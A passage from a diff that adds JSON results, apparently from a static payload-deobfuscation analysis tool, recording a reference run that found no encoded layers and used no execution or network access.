+      "implementation": "reference",
+      "latency_ms": 0.010846008080989122,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    }
+  ]
+}
